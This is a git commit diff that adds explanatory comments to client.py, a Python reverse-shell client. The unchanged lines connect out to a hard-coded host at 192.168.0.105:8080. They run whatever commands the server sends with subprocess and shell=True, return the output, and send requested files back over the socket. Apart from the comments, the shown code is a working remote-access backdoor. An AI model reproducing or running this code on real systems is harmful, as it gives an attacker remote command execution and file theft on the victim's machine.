7b5b45924054cae921db7024b53cd610bbb1895f
SxNade <73271976+SxNade@users.noreply.github.com>
2021-01-04 11:39:32 -0500

    Update client.py

--- client.py
+++ client.py
@@ -6,8 +6,9 @@ import socket
 import subprocess
 from termcolor import colored
 import os
+#importing the required libraries
 
-
+#defining a transfer function to process files to be downloaede
 def transfer(s, path):
     if os.path.exists(path):
         f = open(path, 'rb')
@@ -18,6 +19,8 @@ def transfer(s, path):
         s.send('DONE'.encode())
     else:
         s.send('FILE NOT FOUND'.encode())
+
+#function which initiates the connection to the server
 def connecting():
     s = socket.socket()
     s.connect(("192.168.0.105", 8080))
@@ -41,11 +44,14 @@ def connecting():
             except Exception as e:
                 s.send(('[-] ' + str(e)).encode())
         else:
+            #running the command received by the server & also sending the result or encountered while processing
             CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
             s.send(CMD.stdout.read())
             s.send(CMD.stderr.read())
 
+#defining a main function to run the whole program 
 def main():
     connecting()
 
+#finally running the main function to start the server!
 main()
